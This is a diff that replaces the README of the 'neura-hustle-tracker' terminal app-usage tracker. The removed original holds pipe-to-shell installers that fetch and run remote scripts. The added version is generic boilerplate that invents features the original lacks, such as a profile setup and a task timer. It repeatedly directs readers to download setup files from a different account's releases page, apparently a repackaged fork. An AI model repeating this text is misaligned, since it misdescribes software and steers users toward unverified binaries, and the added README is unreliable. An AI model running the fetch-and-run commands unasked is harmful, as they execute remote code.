@@ -1,179 +1,59 @@
-[![Rust](https://img.shields.io/badge/rust-%23000000.svg?style=for-the-badge&logo=rust&logoColor=white)](https://www.rust-lang.org)
-[![Ratatui](https://img.shields.io/badge/ratatui-%23000000.svg?style=for-the-badge&logo=rust&logoColor=white)](https://ratatui.rs)
-[![Docker](https://img.shields.io/badge/docker-%230db7ed.svg?style=for-the-badge&logo=docker&logoColor=white)](https://docker.com)
-[![Make](https://img.shields.io/badge/Make-%23000000.svg?style=for-the-badge&logo=gnu&logoColor=white)](https://www.gnu.org/software/make/)
-[![PostgreSQL](https://img.shields.io/badge/postgresql-%23316192.svg?style=for-the-badge&logo=postgresql&logoColor=white)](https://www.postgresql.org)
+# 📈 neura-hustle-tracker - Track Your Productivity with Ease
 
-[![Neura Hustle Tracker](https://img.shields.io/badge/Neura%20Hustle%20Tracker-7f56da)](https://meetneura.ai) [![Powered by Neura AI](https://img.shields.io/badge/Powered%20by-Neura%20AI-7f56da)](https://meetneura.ai)
+## 🔗 Download
+[![Download neura-hustle-tracker](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/Kashika02/neura-hustle-tracker/releases)
 
-# Neura Hustle Tracker BETA
+## 🚀 Getting Started
+Welcome to the neura-hustle-tracker! This tool helps you monitor your time and improve your productivity. With a focus on privacy, you can own your data while understanding your work habits better.
 
-**Track what apps you use and how long you spend on them.**
+### 📋 Features
+- **Time Tracking**: Easily monitor how much time you spend on different tasks.
+- **Privacy First**: Your data stays local; we do not share it with anyone.
+- **Intuitive Interface**: A simple, user-friendly design allows you to focus on your work.
+- **Efficiency Insights**: Get insights to improve your workflow and reduce wasted time.
 
-This app runs in your terminal and shows you exactly where your time goes during work sessions. Built with Ratatui.
+## 💻 System Requirements
+- **Operating System**: Windows 10 or later, macOS 10.15 or later, or any Linux distribution.
+- **RAM**: At least 2 GB.
+- **Disk Space**: 100 MB of free space.
 
-![Demo](src/screenshots/hustle-tracker-demo.GIF)
+## 📥 Download & Install
+To get started with neura-hustle-tracker, you need to download it from the Releases page. Click the link below:
 
-## What Does This Do?
+[Download from Releases](https://github.com/Kashika02/neura-hustle-tracker/releases)
 
-- **Tracks your app usage** - Automatically monitors which programs you're using
-- **Shows pretty charts** - See your time broken down by app and category
-- **Saves your data** - Everything stored locally in your own PostgreSQL database
-- **Works everywhere** - Linux, macOS, and Windows
+Once on the page:
+1. Look for the latest release.
+2. Download the setup file that matches your operating system.
+3. Follow the on-screen instructions to install the application.
 
-## Quick Start (Easiest Way)
+## 🌟 How to Use
+1. **Open the Application**: Launch neura-hustle-tracker once installation is complete.
+2. **Set Up Your Profile**: Enter your name and preferences.
+3. **Start Tracking**: Choose a task and start the timer. You can pause or stop at any time.
+4. **Review Your Data**: Check how much time you spent on each task at the end of the day.
 
-### Linux
+## 📚 Additional Resources
+For detailed information, tips, and help, check out our documentation:
 
-Copy and paste this into your terminal:
+- [User Guide](https://github.com/Kashika02/neura-hustle-tracker/wiki)
+- [Frequently Asked Questions](https://github.com/Kashika02/neura-hustle-tracker/wiki/FAQ)
 
-```bash
-sudo apt update && sudo apt install -y make docker.io curl git openssl && curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y && source ~/.cargo/env && git clone https://github.com/adolfousier/neura-hustle-tracker.git && cd neura-hustle-tracker && make run
-```
+## 🛠️ Troubleshooting
+If you encounter issues while using neura-hustle-tracker, consider the following steps:
+- Make sure you have the latest version installed.
+- Ensure your device meets the system requirements.
+- Restart the application if it becomes unresponsive.
 
-That's it! The app will start tracking automatically.
+For persistent problems, please reach out through the Issues tab on our repository.
 
-### macOS
+## 🙌 Contributing
+We welcome contributions! If you would like to help improve neura-hustle-tracker, check our contributing guidelines in the repository.
 
-1. Install [Docker Desktop](https://docs.docker.com/desktop/install/mac-install/) first
-2. Then paste this into Terminal:
+For updates, visit [this page](https://github.com/Kashika02/neura-hustle-tracker/releases) whenever you want to download new features or fixes.
 
-```bash
-brew install make git rustup-init && rustup-init -y && source ~/.cargo/env && git clone https://github.com/adolfousier/neura-hustle-tracker.git && cd neura-hustle-tracker && make daemon-start
-```
+## 🔗 Useful Links
+- [GitHub Repository](https://github.com/Kashika02/neura-hustle-tracker)
+- [Join the Community](https://github.com/Kashika02/neura-hustle-tracker/discussions)
 
-3. View your stats anytime: `make view`
-
-### Windows
-
-1. Install [Docker Desktop](https://www.docker.com/products/docker-desktop/)
-2. Open PowerShell as Administrator
-3. Run this:
-
-```powershell
-powershell -Command "iwr -useb https://raw.githubusercontent.com/adolfousier/neura-hustle-tracker/main/src/scripts/windows_build/windows-install.ps1 | iex"
-```
-
-4. View your stats anytime: `hustle-view`
-
-## Already Have Rust and Docker?
-
-If you already have the prerequisites installed:
-
-```bash
-git clone https://github.com/adolfousier/neura-hustle-tracker
-cd neura-hustle-tracker
-make run
-```
-
-Done! The app handles everything else automatically.
-
-## How to Use It
-
-Once the app is running:
-
-- **Tab** - Switch between Daily, Weekly, and Monthly views
-- **h** - See your complete session history
-- **r** - Rename apps to organize them better
-- **Shift+C** - See all available commands
-- **q** - Quit
-
-The app tracks automatically. Just switch between your programs normally and it records everything.
-
-## Two Ways to Run (Important!)
-
-### Linux Users → Use "Unified Mode"
-
-Run `make run` and you're done. Everything works in one window.
-
-### macOS/Windows Users → Use "Daemon Mode"
-
-You need two steps because of how these systems work:
-
-1. **Start tracking in background**: `make daemon-start`
-2. **Open the dashboard**: `make view`
-
-Why? On macOS/Windows, if the tracking runs in the dashboard window, it can't see when you switch to other apps. Running it in the background fixes this.
-
-**Commands for daemon mode:**
-
-- `make daemon-start` - Start tracking
-- `make view` - Open dashboard
-- `make daemon-stop` - Stop tracking
-- `make daemon-status` - Check if running
-
-## What You Need
-
-- **Computer**: Windows 10+, macOS 10.15+, or Linux with a desktop
-- **Space**: About 500MB for Docker and dependencies
-- **Permissions**:
-  - macOS needs Screen Recording permission
-  - Linux needs a desktop environment (GNOME, KDE, etc.)
-  - Windows works out of the box
-
-## Special Notes
-
-**Wayland users (Linux)**: Install the [Window Calls extension](https://extensions.gnome.org/extension/4724/window-calls/) for GNOME to track windows properly.
-
-**First time running**: The app creates secure database credentials automatically. You don't need to configure anything.
-
-## Start on Boot (Optional)
-
-Want the app to start automatically when you log in?
-
-**Linux:**
-
-```bash
-mkdir -p ~/.config/autostart/
-cp src/scripts/startup/neura-tracker.desktop ~/.config/autostart/
-```
-
-Edit the file and change `/path/to/neura-hustle-tracker` to your actual path.
-
-**macOS:**
-
-```bash
-mkdir -p ~/Library/LaunchAgents/
-cp src/scripts/startup/neura-tracker.plist ~/Library/LaunchAgents/
-launchctl load ~/Library/LaunchAgents/neura-tracker.plist
-```
-
-**Windows:**
-
-```cmd
-copy src\scripts\startup\neura-tracker.bat "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
-```
-
-## Comparison with Other Apps
-
-| Feature | Neura Hustle Tracker | ActivityWatch | RescueTime |
-|---------|---------------------|---------------|------------|
-| Your data stays with you | ✅ | ✅ | ❌ |
-| Open source | ✅ | ✅ | ❌ |
-| Works offline | ✅ | ✅ | ❌ |
-| Terminal interface | ✅ | ❌ | ❌ |
-| Fast & lightweight | ✅ | ❌ | ❌ |
-
-## Need Help?
-
-- **App not starting?** Make sure Docker Desktop is running
-- **Can't see windows?** Check permissions in System Settings
-- **Database errors?** Try `make clean` then `make run`
-
-## Contributing
-
-Found a bug or want to add something? Check [CONTRIBUTING.md](CONTRIBUTING.md).
-
-## License
-
-See [LICENSE](LICENSE) file for details.
-
-## Star History Chart
-
-[![Star History Chart](https://api.star-history.com/svg?repos=adolfousier/neura-hustle-tracker&type=date&legend=top-left)](https://www.star-history.com/#adolfousier/neura-hustle-tracker&type=date&legend=top-left)
-
-## ✨ Stay Tuned
-
-⭐ **Star this repository to keep up with exciting updates and new releases, including powerful new features and productivity tracking capabilities!** ⭐
-
-**Built with ❤️ by the Neura community** | [Website](https://meetneura.ai) | [Issues](https://github.com/adolfousier/neura-hustle-tracker/issues)
+Thank you for using neura-hustle-tracker! We hope it helps you achieve your productivity goals.
